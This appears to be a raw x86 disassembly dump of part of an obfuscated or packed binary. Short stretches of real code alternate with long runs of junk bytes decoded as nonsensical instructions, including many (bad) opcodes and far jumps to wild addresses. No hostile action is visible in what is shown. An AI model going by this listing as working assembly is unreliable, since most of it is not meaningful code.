  402172:	jg     0x4021f2
  402174:	jle    0x4021d7
  402176:	inc    eax
  402177:	sbb    BYTE PTR [eax+0x6d],ah
  40217a:	gs pop edx
  40217c:	push   cs
  40217d:	retf   
  40217e:	lods   eax,DWORD PTR ds:[esi]
  40217f:	mov    esi,0xa002ab8
  402184:	jmp    0xf217ca5
  402189:	inc    eax
  40218a:	stos   BYTE PTR es:[edi],al
  40218b:	or     al,0x43
  40218d:	xchg   ebx,eax
  40218e:	cmp    eax,0x663594ae
  402193:	xor    al,0x11
  402195:	fnstenv [ebx]
  402197:	out    0x46,eax
  402199:	mov    esp,0x1d783c67
  40219e:	and    DWORD PTR [eax+ebx*1-0xc],ebp
  4021a2:	loopne 0x4021d6
  4021a4:	sahf   
  4021a5:	sub    DWORD PTR [eax],ecx
  4021a7:	ret    
  4021a8:	add    eax,eax
  4021aa:	cmp    DWORD PTR [ebp+0x1e5cd44e],edi
  4021b0:	jno    0x40216a
  4021b2:	adc    eax,0x8afd668c
  4021b7:	mov    esp,0xcbd2b190
  4021bc:	addr16 gs cmp al,0x46
  4021c0:	xchg   ch,ch
  4021c2:	lds    ecx,FWORD PTR [edi]
  4021c4:	xchg   ebp,eax
  4021c5:	pop    esp
  4021c6:	push   esi
  4021c7:	cmp    eax,0x42a02882
  4021cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ce:	lock iret 
  4021d0:	cmp    BYTE PTR [edi+0xd],ah
  4021d3:	(bad)  
  4021d4:	jecxz  0x402249
  4021d6:	xor    BYTE PTR [edi-0xc],dh
  4021d9:	mov    ecx,0x5ea1ace3
  4021de:	jecxz  0x4021f6
  4021e0:	cmp    al,0xda
  4021e2:	js     0x40217b
  4021e4:	add    ch,BYTE PTR [ebp+0x24969fc0]
  4021ea:	ins    BYTE PTR es:[edi],dx
  4021eb:	cdq    
  4021ec:	shr    BYTE PTR [esi-0x3d],0xf3
  4021f0:	pop    esi
  4021f1:	jge    0x4021eb
  4021f3:	mov    ebp,0x217e2313
  4021f8:	fs xchg edx,eax
  4021fa:	jo     0x4021ed
  4021fc:	fcomp  st(0)
  4021fe:	mov    ebx,0xf953a984
  402203:	pop    esp
  402204:	jo     0x40218a
  402206:	mov    ah,0x9b
  402208:	or     DWORD PTR [ecx-0x7ae54495],ebx
  40220e:	pushf  
  40220f:	pop    ebp
  402210:	into   
  402211:	fisttp DWORD PTR [esi-0x46]
  402214:	add    bl,dl
  402216:	xchg   BYTE PTR [eax],al
  402218:	(bad)  
  402219:	pusha  
  40221a:	repz ror DWORD PTR [bp+si],0x91
  40221f:	xchg   BYTE PTR [eax+0x58],bh
  402222:	mov    DWORD PTR [esi],edi
  402224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402225:	push   ss
  402226:	retf   0x881f
  402229:	call   0xd280fe5e
  40222e:	out    0x53,eax
  402230:	fcomp  DWORD PTR [eax-0x77b9a85e]
  402236:	(bad)  
  402237:	xor    eax,0x3e8dcf24
  40223c:	out    dx,al
  40223d:	jecxz  0x402202
  40223f:	inc    edx
  402240:	sbb    BYTE PTR [ebx],cl
  402242:	fimul  WORD PTR [ebx+eiz*1]
  402245:	(bad)  
  402246:	out    0x4a,al
  402248:	push   edi
  402249:	push   ebp
  40224a:	adc    al,0xcc
  40224c:	cdq    
  40224d:	push   ss
  40224e:	add    edx,edx
  402250:	retf   
  402251:	jmp    0x578a8289
  402256:	pusha  
  402257:	sbb    eax,DWORD PTR [edi]
  402259:	pop    edi
  40225a:	push   eax
  40225b:	psrld  mm4,mm7
  40225e:	sti    
  40225f:	push   edi
  402260:	lahf   
  402261:	stos   BYTE PTR es:[edi],al
  402262:	jno    0x4022b5
  402264:	stos   BYTE PTR es:[edi],al
  402265:	cld    
  402266:	mov    ds:0x6c8a47d8,eax
  40226b:	leave  
  40226c:	adc    DWORD PTR [ecx],edx
  40226e:	xchg   edx,eax
  40226f:	or     DWORD PTR [eax-0x7c],edx
  402272:	mov    dh,BYTE PTR [esi]
  402274:	stos   DWORD PTR es:[edi],eax
  402275:	pushf  
  402276:	jnp    0x402205
  402278:	test   DWORD PTR [ebp+0xb4fbbf1],0x42d74c93
  402282:	sar    bl,1
  402284:	sbb    eax,0x2547508e
  402289:	mov    cl,0xe
  40228b:	dec    ebp
  40228c:	adc    DWORD PTR [edx-0x80],ebx
  40228f:	lahf   
  402290:	test   al,0x97
  402292:	outs   dx,DWORD PTR ds:[esi]
  402293:	in     al,dx
  402294:	xchg   esi,eax
  402295:	sbb    ecx,ebx
  402297:	inc    edi
  402298:	or     BYTE PTR [edx],bh
  40229a:	out    dx,al
  40229b:	jmp    0x83c8:0xcf428d5a
  4022a2:	shl    DWORD PTR [esi],cl
  4022a4:	ret    0xcab1
  4022a7:	jmp    0x65c77629
  4022ac:	mov    ecx,0x3247e4cb
  4022b1:	sub    edx,eax
  4022b3:	mov    ebp,0x29becbb
  4022b8:	mov    dh,0x4a
  4022ba:	mov    ecx,0xee212b82
  4022bf:	scas   al,BYTE PTR es:[edi]
  4022c0:	inc    esp
  4022c1:	sub    al,0xb2
  4022c3:	repnz out 0xbf,al
  4022c6:	inc    edx
  4022c7:	cmp    eax,DWORD PTR [eax]
  4022c9:	rcl    BYTE PTR [edx-0x37065173],0xe3
  4022d0:	push   edx
  4022d1:	add    al,0xef
  4022d3:	dec    ebp
  4022d4:	bound  eax,QWORD PTR [edx+edx*2]
  4022d7:	das    
  4022d8:	jmp    0x4a29:0x2fa0c4d2
  4022df:	stos   DWORD PTR es:[edi],eax
  4022e0:	stos   DWORD PTR es:[edi],eax
  4022e1:	cwde   
  4022e2:	bound  edi,QWORD PTR gs:[ebp+0x3d]
  4022e6:	(bad)
  4022e9:	inc    ebx
  4022ea:	arpl   bx,bx
  4022ec:	pushf  
  4022ed:	pop    ds
  4022ee:	inc    edx
  4022ef:	in     al,dx
  4022f0:	ret    
  4022f1:	xchg   ebp,eax
  4022f2:	pop    ecx
  4022f3:	xor    ebx,ebp
  4022f5:	xchg   esi,eax
  4022f6:	cmc    
  4022f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f8:	pop    esp
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	jle    0x402373
  402359:	adc    BYTE PTR [edi],0x9a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x4022f2
  402364:	add    eax,eax
  402366:	in     eax,0x7e
  402368:	and    ch,BYTE PTR [esi+0x31f2e57e]
  40236e:	adc    al,0x0
  402370:	pop    ebx
  402371:	outs   dx,DWORD PTR ds:[esi]
  402372:	test   BYTE PTR [ecx+0x53],bl
  402375:	and    al,0xd6
  402377:	jae    0x4023aa
  402379:	xor    BYTE PTR [edx+ebx*4-0x25a8ad37],bl
  402380:	pop    edx
  402381:	addr16 adc al,0x66
  402384:	call   0x2877c65c
  402389:	stos   DWORD PTR es:[edi],eax
  40238a:	adc    edi,esp
  40238c:	mov    cl,0xb0
  40238e:	stos   DWORD PTR es:[edi],eax
  40238f:	into   
  402390:	mov    al,ds:0xe8c0e672
  402395:	sbb    ah,BYTE PTR [esi]
  402397:	push   esp
  402398:	cld    
  402399:	jns    0x402362
  40239b:	imul   esi,DWORD PTR [edx+ebx*8],0xffffffde
  40239f:	xchg   ebp,eax
  4023a0:	daa    
  4023a1:	jmp    0x85c5dac3
  4023a6:	jle    0x4023c0
  4023a8:	pusha  
  4023a9:	xchg   edi,eax
  4023aa:	cdq    
  4023ab:	inc    esp
  4023ac:	xchg   edx,eax
  4023ad:	xor    BYTE PTR [esp+esi*2],ch
  4023b0:	sahf   
  4023b1:	jg     0x402426
  4023b3:	sbb    ah,BYTE PTR [ecx-0x60]
  4023b6:	(bad)  
  4023b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023b8:	mov    BYTE PTR [ecx],dl
  4023ba:	mov    dl,0x73
  4023bc:	pop    esi
  4023bd:	ret    
  4023be:	add    al,0x5
  4023c0:	push   ebp
  4023c1:	jb     0x4023f8
  4023c3:	or     eax,0x79dc8ce4
  4023c8:	sbb    al,0x6
  4023ca:	push   ecx
  4023cb:	push   0x41
  4023cd:	cmc    
  4023ce:	repnz pushf 
  4023d0:	bound  ecx,QWORD PTR ds:0x3b9bb925
  4023d6:	mov    bh,0xd9
  4023d8:	xchg   esp,eax
  4023d9:	xlat   BYTE PTR ds:[ebx]
  4023da:	ds (bad) 
  4023de:	ss add cl,bl
  4023e1:	jmp    0xf5cb:0xc4a8c563
  4023e8:	es push ds
  4023ea:	mov    ecx,0x1b07d68b
  4023ef:	jbe    0x402423
  4023f1:	lea    esi,[eax-0x3f9fabe2]
  4023f7:	mov    al,BYTE PTR [edx]
  4023f9:	push   edx
  4023fa:	retf   0x5a59
  4023fd:	inc    eax
  4023fe:	xchg   ebp,eax
  4023ff:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402401:	dec    ebp
  402402:	pop    ds
  402403:	aaa    
  402404:	sbb    esp,DWORD PTR [ecx-0xd22d46b]
  40240a:	cs inc edi
  40240c:	aas    
  40240d:	mov    al,ds:0x309fc3d7
  402412:	mov    ebp,0xed911457
  402417:	pusha  
  402418:	push   eax
  402419:	fimul  WORD PTR [eax-0x72]
  40241c:	dec    edi
  40241d:	rcl    BYTE PTR ss:[esi-0x4fe91e15],0x60
  402425:	jge    0x402434
  402427:	addr16 pop ecx
  402429:	lock xor esp,edi
  40242c:	and    BYTE PTR [eax+0x45334da9],ch
  402432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402433:	loop   0x40249e
  402435:	iret   
  402436:	scas   al,BYTE PTR es:[edi]
  402437:	mov    esi,DWORD PTR [ebx-0x34]
  40243a:	fdiv   QWORD PTR [eax+0x2b]
  40243d:	xor    BYTE PTR [eax-0x10],0xc6
  402441:	inc    edi
  402442:	cdq    
  402443:	rcl    edx,1
  402445:	jmp    0x4023df
  402447:	sbb    ch,al
  402449:	in     eax,dx
  40244a:	pop    ebp
  40244b:	and    BYTE PTR [ebp+0x1a78fe9a],0x12
  402452:	mov    ebp,0x1f579b29
  402457:	cld    
  402458:	mov    ecx,0xe03a02e6
  40245d:	arpl   WORD PTR [eax-0x7fa6910b],si
  402463:	pop    ecx
  402464:	jae    0x402450
  402466:	gs jecxz 0x40246e
  402469:	or     al,0xe5
  40246b:	xchg   ebp,eax
  40246c:	shl    DWORD PTR [esi+0x28],cl
  40246f:	les    ecx,FWORD PTR [edi]
  402471:	cld    
  402472:	cmp    eax,0x5ed22636
  402477:	sub    al,0x21
  402479:	dec    esp
  40247a:	add    BYTE PTR [edx+esi*8-0x4ba4c676],dl
  402481:	jmp    0x60a6:0x9283b1a
  402488:	(bad)  
  402489:	cmp    ebp,esp
  40248b:	pop    esp
  40248c:	xchg   edx,eax
  40248d:	cmc    
  40248e:	ins    DWORD PTR es:[edi],dx
  40248f:	adc    dl,al
  402491:	shl    BYTE PTR [esp+ebx*1],1
  402494:	outs   dx,BYTE PTR ds:[esi]
  402495:	jb     0x40245b
  402497:	xchg   esp,eax
  402498:	cld    
  402499:	fwait
  40249a:	test   al,0xf3
  40249c:	jecxz  0x4024da
  40249e:	js     0x402460
  4024a0:	cmp    eax,0xb23a486a
  4024a5:	ror    DWORD PTR [esi-0x6bfaa79a],cl
  4024ab:	leave  
  4024ac:	rcl    BYTE PTR [ebx-0x2d],0x17
  4024b0:	jo     0x4024f5
  4024b2:	cmp    DWORD PTR [esi-0x54],ebx
  4024b5:	add    DWORD PTR [edi],edx
  4024b7:	jne    0x4024ca
  4024b9:	pusha  
  4024ba:	fs mov bl,0x9a
  4024bd:	fwait
  4024be:	inc    edx
  4024bf:	mov    ebx,0x5a81fcba
  4024c4:	adc    BYTE PTR [esi+0x3a281406],ch
  4024ca:	xor    BYTE PTR [ecx-0x6b],bl
  4024cd:	add    DWORD PTR [ebx-0x4c557dd],ebx
  4024d3:	sub    ah,cl
  4024d5:	fwait
  4024d6:	das    
  4024d7:	ret    0xcb61
  4024da:	jg     0x4024c1
  4024dc:	inc    edi
  4024dd:	or     DWORD PTR [edi-0x2a],eax
  4024e0:	mov    ebp,0x639a347d
  4024e5:	pop    edx
  4024e6:	ror    DWORD PTR [ebx+0x4589f045],0xf0
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	pop    ebp
  40250e:	lock test eax,0x7e0126b2
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x4024e7
  40251a:	icebp  
  40251b:	push   ebp
  40251c:	mov    dh,0x50
  40251e:	cmp    DWORD PTR [eax],esi
  402520:	xchg   ebp,eax
  402521:	mov    dl,0x3
  402523:	dec    ecx
  402524:	xchg   esp,eax
  402525:	sub    DWORD PTR [esi-0x6f0e1bfc],ebx
  40252b:	xor    DWORD PTR [ecx+0x6259d448],0xffffffaa
  402532:	outs   dx,DWORD PTR ds:[esi]
  402533:	mov    bl,0x58
  402535:	pop    ebx
  402536:	jl     0x40251b
  402538:	fld    TBYTE PTR [ebx]
  40253a:	or     edx,DWORD PTR ds:0x642ae1b4
  402540:	bound  ecx,QWORD PTR [esi]
  402542:	jle    0x402555
  402544:	cdq    
  402545:	xchg   ecx,eax
  402546:	daa    
  402547:	mov    ds:0x88f74eff,al
  40254c:	(bad)  
  40254d:	adc    ebx,edi
  40254f:	mov    edx,0x873555a3
  402554:	test   BYTE PTR [ecx+0xd20fc2c],dh
  40255a:	js     0x402589
  40255c:	add    al,0x1d
  40255e:	jmp    0x402540
  402560:	sub    BYTE PTR ds:0xe40af664,ah
  402566:	inc    ecx
  402567:	and    DWORD PTR [esi-0x2f],0x3a3aae54
  40256e:	push   ecx
  40256f:	fisubr DWORD PTR [ecx-0x453955fd]
  402575:	adc    ebp,DWORD PTR [edx-0x660d705]
  40257b:	shr    DWORD PTR [ebp-0x48],0xf2
  40257f:	add    eax,edi
  402581:	dec    ecx
  402582:	mov    dl,0x90
  402584:	rcr    DWORD PTR [esi],0x86
  402587:	xchg   esp,eax
  402588:	data16 mov al,0x4d
  40258b:	mov    DWORD PTR [edi-0x75ce7f7a],0x3778fc20
  402595:	xchg   BYTE PTR [ecx],dh
  402597:	jp     0x402613
  402599:	pop    edx
  40259a:	jo     0x4025bf
  40259c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40259d:	inc    ebx
  40259e:	adc    eax,0x888d1571
  4025a3:	adc    eax,0x7fba8ed8
  4025a8:	xor    DWORD PTR [ebx-0x32],ebx
  4025ab:	and    eax,ebp
  4025ad:	pop    ecx
  4025ae:	loope  0x402555
  4025b0:	inc    edx
  4025b1:	pop    esp
  4025b2:	push   ecx
  4025b3:	ret    
  4025b4:	(bad)  
  4025b5:	ins    DWORD PTR es:[edi],dx
  4025b6:	sub    DWORD PTR [eax],0xffffff82
  4025b9:	pushf  
  4025ba:	clc    
  4025bb:	push   es
  4025bc:	fdiv   DWORD PTR [ecx+0x407f885e]
  4025c2:	or     ah,BYTE PTR [ecx-0x44]
  4025c5:	mov    edi,0x33c34b8a
  4025ca:	sbb    BYTE PTR [ebx+0x4203f9e0],ch
  4025d0:	call   0x82e76c4
  4025d5:	rcr    DWORD PTR [esi],cl
  4025d7:	scas   al,BYTE PTR es:[edi]
  4025d8:	pop    edx
  4025d9:	imul   ebp,DWORD PTR [ebx+0x37222021],0x67
  4025e0:	retf   0x37c6
  4025e3:	cli    
  4025e4:	shl    DWORD PTR [edx+ebx*8],cl
  4025e7:	jne    0x4025c7
  4025e9:	push   edi
  4025ea:	or     BYTE PTR [ecx],bh
  4025ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025ed:	(bad)  
  4025ee:	icebp  
  4025ef:	sub    eax,0x3803f849
  4025f4:	fs (bad) 
  4025f6:	stos   DWORD PTR es:[edi],eax
  4025f7:	and    BYTE PTR [eax+0x3aaf4efe],ah
  4025fd:	repnz aaa 
  4025ff:	stos   DWORD PTR es:[edi],eax
  402600:	rcl    BYTE PTR [ecx+0x737e673e],cl
  402606:	mov    ebp,ecx
  402608:	mov    al,0xe1
  40260a:	movaps xmm2,XMMWORD PTR [edx-0x41]
  40260e:	dec    esi
  40260f:	sub    eax,ecx
  402611:	push   0x266a0059
  402616:	cdq    
  402617:	and    ebp,eax
  402619:	sbb    DWORD PTR [eax+0x463fbc90],esp
  40261f:	aaa    
  402620:	sub    cl,BYTE PTR [edi-0x7a3738ea]
  402626:	xor    DWORD PTR cs:[edx+eiz*2-0x118ec625],esp
  40262e:	push   ebp
  40262f:	push   edi
  402630:	out    dx,eax
  402631:	fwait
  402632:	aas    
  402633:	rcr    DWORD PTR [ebx],1
  402635:	stos   BYTE PTR es:[edi],al
  402636:	inc    edi
  402637:	loopne 0x4026a6
  402639:	ret    
  40263a:	loope  0x402623
  40263c:	or     ebx,ecx
  40263e:	and    ecx,DWORD PTR [ebx-0x6b]
  402641:	jno    0x402663
  402643:	add    BYTE PTR [ecx-0x11a4157e],0x21
  40264a:	pop    ebx
  40264b:	ins    BYTE PTR es:[edi],dx
  40264c:	lods   eax,DWORD PTR ds:[esi]
  40264e:	xchg   ebp,eax
  40264f:	cli    
  402650:	jmp    0x402679
  402652:	dec    edi
  402653:	call   0x6617657a
  402658:	shl    BYTE PTR [edi],cl
  40265a:	into   
  40265b:	int3   
  40265c:	mov    cl,0x4b
  40265e:	sub    ecx,DWORD PTR [edx-0x1e]
  402661:	scas   eax,DWORD PTR es:[edi]
  402662:	daa    
  402663:	xchg   dl,dh
  402665:	add    ebp,DWORD PTR [esi-0x72]
  402668:	jnp    0x402657
  40266a:	test   BYTE PTR [edx-0x27e152c5],ah
  402670:	sub    eax,0xcf983d45
  402675:	call   0x379b:0x87aab294
  40267c:	dec    DWORD PTR [ebx-0x7986483d]
  402682:	inc    eax
  402683:	(bad)  
  402685:	add    cl,dl
  402687:	adc    al,0xaa
  402689:	pop    edx
  40268a:	pop    ebp
  40268b:	inc    edi
  40268c:	adc    edi,DWORD PTR [ebx-0x3e3d1952]
  402692:	adc    al,0x66
  402694:	rcl    DWORD PTR [ebp+ebp*2+0x5f],cl
  402698:	mov    edi,0x32e0b90e
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	test   al,0xff
  4026d4:	xchg   ebx,eax
  4026d5:	mov    cl,0xa2
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026d3
  4026df:	sbb    DWORD PTR [eax],0x3821d1e9
  4026e5:	daa    
  4026e6:	scas   eax,DWORD PTR es:[edi]
  4026e7:	cmp    cl,BYTE PTR [ebp+0x12]
  4026ea:	add    BYTE PTR [edx],0x52
  4026ed:	or     bl,BYTE PTR [ecx]
  4026ef:	ds cmp eax,0x5e1c593
  4026f5:	sbb    edx,ebx
  4026f7:	pop    ds
  4026f8:	mov    edx,0xe6fd23d5
  4026fd:	mov    ah,BYTE PTR [esi]
  4026ff:	fadd   DWORD PTR [eax]
  402701:	mov    dl,0x7
  402703:	dec    edx
  402704:	test   eax,0xddb8e2c4
  402709:	and    dh,BYTE PTR [esp+edx*8-0x50680470]
  402710:	xchg   bh,cl
  402712:	fdivr  DWORD PTR [esi+ecx*8+0xbc2df68]
  402719:	adc    al,0x74
  40271b:	out    dx,eax
  40271c:	out    0x7,eax
  40271e:	mov    dh,0x14
  402720:	xchg   esi,eax
  402721:	push   ebp
  402722:	mov    ds,WORD PTR [eax-0x322064d0]
  402728:	cmp    edi,eax
  40272a:	ret    0x239d
  40272d:	mov    dh,0xd1
  40272f:	xchg   BYTE PTR [ecx+0x21253aa7],cl
  402735:	mov    DWORD PTR [edi+0xbbb1dda],ebx
  40273b:	mov    edi,0xf355ca1
  402740:	cli    
  402741:	sahf   
  402742:	loopne 0x4026df
  402744:	std    
  402745:	xchg   edx,eax
  402746:	mov    ds:0xcdcddaed,eax
  40274b:	pop    ecx
  40274c:	cs adc al,0x3c
  40274f:	and    edi,esp
  402751:	es ret 0x71cf
  402755:	mov    ecx,0x33c0f807
  40275a:	cmp    BYTE PTR [ebp+0x23],0xb
  40275e:	test   ch,0x51
  402761:	into   
  402762:	push   edi
  402763:	mov    al,es:0xb2c32f0e
  402769:	or     al,0x61
  40276b:	out    0xa4,al
  40276d:	idiv   BYTE PTR [ebx-0x7c408823]
  402773:	adc    dl,BYTE PTR [edi]
  402775:	inc    DWORD PTR [esi-0x31729722]
  40277b:	mov    esp,0xabd5a463
  402780:	aam    0xfd
  402782:	ror    ebx,1
  402784:	out    0x47,al
  402786:	iret   
  402787:	pop    es
  402788:	mov    WORD PTR ds:0x3b80288a,?
  40278e:	ss stc 
  402790:	mov    ecx,0xd65cbdb9
  402795:	push   ebp
  402796:	mov    ds:0xf699de26,al
  40279b:	mov    eax,esi
  40279d:	pop    eax
  40279e:	dec    eax
  40279f:	ss dec esi
  4027a1:	lods   al,BYTE PTR ds:[esi]
  4027a2:	push   DWORD PTR [ebx]
  4027a4:	cli    
  4027a5:	pusha  
  4027a6:	mov    bh,0xcb
  4027a8:	inc    esp
  4027a9:	and    al,0xef
  4027ab:	adc    edi,edx
  4027ad:	fild   WORD PTR [eax-0x12]
  4027b0:	ins    BYTE PTR es:[edi],dx
  4027b1:	lock or eax,0xe34f1196
  4027b7:	jb     0x4027a9
  4027b9:	adc    dh,BYTE PTR [edi-0x72]
  4027bc:	cmp    BYTE PTR [ebp+esi*4+0x4a],bh
  4027c0:	sub    al,BYTE PTR [edi+0x50]
  4027c3:	dec    eax
  4027c4:	xor    eax,0xbe0327a9
  4027c9:	shl    BYTE PTR [ebp+ecx*2+0x5f],1
  4027cd:	pop    esi
  4027ce:	cmp    ebx,ecx
  4027d0:	into   
  4027d1:	and    DWORD PTR [esi+0x4f],esp
  4027d4:	in     al,dx
  4027d5:	push   cs
  4027d6:	sbb    dh,BYTE PTR [edi]
  4027d8:	cld    
  4027d9:	lahf   
  4027da:	fs adc al,0x71
  4027dd:	ret    
  4027de:	fcomp  QWORD PTR [ebx]
  4027e0:	mov    dl,0xad
  4027e2:	daa    
  4027e3:	into   
  4027e4:	out    0x6c,eax
  4027e6:	xor    BYTE PTR [edx-0x686a49d],0x5
  4027ed:	inc    esp
  4027ee:	jge    0x4027f2
  4027f0:	jnp    0x402794
  4027f2:	std    
  4027f3:	push   eax
  4027f4:	out    dx,eax
  4027f5:	mov    bh,BYTE PTR [esp+ebp*4+0x19]
  4027f9:	xlat   BYTE PTR ds:[ebx]
  4027fa:	aas    
  4027fb:	mov    bh,0x48
  4027fd:	scas   al,BYTE PTR es:[edi]
  4027fe:	jne    0x4027ff
  402800:	xor    DWORD PTR [ebx-0xd],0xa520e54b
  402807:	ret    0xdc89
  40280a:	cmc    
  40280b:	xchg   esp,eax
  40280c:	pop    edi
  40280d:	cmp    al,0xfd
  40280f:	shl    al,cl
  402811:	jmp    0x376e:0x9a1a67eb
  402818:	or     eax,0x45f4df20
  40281d:	out    0x31,al
  40281f:	xlat   BYTE PTR cs:[ebx]
  402821:	addr16 cmp eax,0x5dd04fd
  402827:	jnp    0x402801
  402829:	dec    esp
  40282a:	pushf  
  40282b:	add    DWORD PTR [ebx+0x72],ecx
  40282e:	imul   edx,DWORD PTR [ecx+0x14],0x19
  402832:	jo     0x402895
  402834:	pop    ecx
  402835:	xor    BYTE PTR [ebp+0x1e],dh
  402838:	mov    esp,0x7dfce27f
  40283d:	jns    0x4027f3
  40283f:	(bad)  
  402840:	mul    DWORD PTR [ecx+0x465ff647]
  402846:	xchg   DWORD PTR [edx-0x5b4bddbf],ebp
  40284c:	jb     0x402846
  40284e:	sub    DWORD PTR [edx+0x5],ecx
  402851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402852:	in     eax,dx
  402853:	hlt    
  402854:	push   esi
  402855:	sbb    DWORD PTR ds:0xa306d5b5,esi
  40285b:	xchg   ebp,eax
  40285c:	ret    0x87c
  40285f:	push   cs
  402860:	stos   BYTE PTR es:[edi],al
  402861:	enter  0x458b,0xd0
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	neg    BYTE PTR [esi+0x64]
  402886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402867
  402890:	dec    edi
  402891:	aam    0xda
  402893:	xadd   cl,dl
  402896:	mov    ch,0x32
  402898:	sub    eax,0x7177591
  40289d:	push   edx
  40289e:	aam    0x8c
  4028a0:	les    ebx,FWORD PTR ds:0x9c8e794c
  4028a6:	xchg   BYTE PTR [ebx-0x61],ah
  4028a9:	inc    edi
  4028aa:	adc    ebp,DWORD PTR [ecx-0x3ec28497]
  4028b0:	pop    edi
  4028b1:	or     eax,0xff2ebb4a
  4028b6:	ds jnp 0x4028f9
  4028b9:	pop    ecx
  4028ba:	not    dl
  4028bc:	or     al,0x4d
  4028be:	inc    edi
  4028bf:	pop    edx
  4028c0:	add    eax,0xd6199c90
  4028c5:	xor    ecx,DWORD PTR [ebx]
  4028c7:	popf   
  4028c8:	sub    BYTE PTR [esi+0x2339169d],cl
  4028ce:	(bad)  
  4028cf:	xlat   BYTE PTR ds:[ebx]
  4028d0:	xchg   edx,eax
  4028d1:	pop    ebp
  4028d2:	and    BYTE PTR [esi],dl
  4028d4:	xchg   ecx,eax
  4028d5:	or     eax,0x87ef91ea
  4028da:	and    ah,dl
  4028dc:	in     eax,0x2e
  4028de:	test   eax,0xd3e0b763
  4028e3:	push   cs
  4028e4:	cmp    cl,BYTE PTR [ebx-0x75]
  4028e7:	cmc    
  4028e8:	push   ebp
  4028e9:	pop    esp
  4028ea:	js     0x4028f0
  4028ec:	lds    ebp,FWORD PTR [eax]
  4028ee:	pop    ds
  4028ef:	mov    cl,0xf5
  4028f1:	sbb    ah,BYTE PTR [ebp+0x5af0413c]
  4028f7:	pop    ebp
  4028f8:	outs   dx,DWORD PTR ds:[esi]
  4028f9:	rcr    DWORD PTR [ebp+0xd6a906f],cl
  4028ff:	icebp  
  402900:	push   0x61
  402902:	xor    eax,0x4a31835d
  402907:	add    eax,0x9f7a1336
  40290c:	or     bh,al
  40290e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402910:	sti    
  402911:	push   es
  402912:	mov    cl,0x7c
  402914:	fidivr DWORD PTR [eax]
  402916:	mov    edx,0x8b7b2d1a
  40291b:	ins    BYTE PTR es:[edi],dx
  40291c:	iret   
  40291d:	mov    edx,DWORD PTR [ebx+0x2e5c2829]
  402923:	add    DWORD PTR [edi+0x44],edi
  402926:	or     BYTE PTR [eax+ecx*1-0x48],bh
  40292a:	push   0x40
  40292c:	fbstp  TBYTE PTR [ebx-0x665b5990]
